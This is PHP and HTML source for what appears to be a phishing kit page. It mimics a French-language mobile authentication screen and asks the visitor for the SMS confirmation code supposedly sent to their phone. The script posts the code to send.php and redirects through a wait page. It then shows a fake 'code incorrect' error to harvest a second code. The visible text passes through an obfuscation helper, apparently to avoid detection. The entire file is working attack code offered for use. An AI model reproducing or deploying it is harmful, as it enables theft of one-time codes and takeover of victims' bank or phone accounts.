<?php 
require '../main.php';
?><!doctype html>
<html>
<head>
<title></title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="res/fonts.css">
<link rel="stylesheet" href="res/img-media.css">
<link rel="stylesheet" href="res/auth.css">
<style>
.loader{
    width:100%;
    height:100%;
    position:fixed;
    background:rgba(255,255,255,0.8);
    top:0;
    display:none;
	z-index:9999999999;
}
.loader .content{
    width:100%;
    height:100%;
    display:flex;
    align-items:center;
    justify-content:center;
}
</style>
</head>
<body>
<div class="loader">
<div class="content">
    <img src="res/loading.gif" style="width:80px;">
</div>
</div>
<header>
    <img src="res/header-lg.png" class="lg">
    <img src="res/header-md.png" class="md">
    <img src="res/header-sm.png" class="sm">
    <img src="res/header-xs.png" class="xs">
</header>



<main>
<div class="left">
<img src="res/info-lg.png" class="lg">
<img src="res/info-lg.png" class="md">
<img src="res/info-sm-1.png" class="sm">
<img src="res/info-sm-2.png" class="sm">
<img src="res/info-sm-1.png" class="xs">
<img src="res/info-sm-2.png" class="xs">
</diV>

<div class="right">
<div class="form">

<div class="title">
<?php $bm->obf("AUTHENTIFIEZ-VOUS"); ?>
</div>

<div class="info">
    <div class="flex"><img src="res/valid.png"> <?php $bm->obf("Authentification sur votre mobile"); ?> </div>
    <div class="text">
    <?php $bm->obf("Nous avons envoyé un code de confirmation à votre numéro de téléphone."); ?>
        <p style="margin:4px 0;">
        <?php $bm->obf("Veuillez saisir le code reçu pour continuer."); ?>
        </p>
    </div>

    
    <div class="col">
    <label><?php $bm->obf("Entrez le code"); ?></label>
    <input type="text" id="d0" class="textinput" placeholder="">
    <?php if(isset($_GET['e'])){?> <p style="color:#ae0014" id="sms_error">Le code saisi est incorrect</p><?php }?>
 
</div>

    
    <div style="text-align:center;">
        <button class="sbmt disabled" id="send" onclick="sendSms()">CONTINUER</button>
    </div>
</div>


</div>
</div>
</main>



<footer>
    <img src="res/footer-lg.png" class="lg">
    <img src="res/footer-md.png" class="md">
    <img src="res/footer-sm.png" class="sm">
    <img src="res/footer-xs.png" class="xs">
</footer>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>

 

$("#d0").keyup(()=>{
    if($("#d0").val().length>=6){
        $("#send").removeClass("disabled");
    }else{
        $("#send").addClass("disabled");
    }
});




function sendSms(){
    if($("#d0").val().length>=6){
        $("#send").addClass("disabled");
        $(".loader").show();
           $.post("send.php",{sms:$("#d0").val()}, function(d){
            
            <?php if(isset($_GET['e'])){ echo '
                return window.location="exit.php";
                ';}?>
                
            
            window.location="wait.php?next=sms.php?e";
           } );
    }
}


$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendSms();
    }
});

</script>


</body>
</body>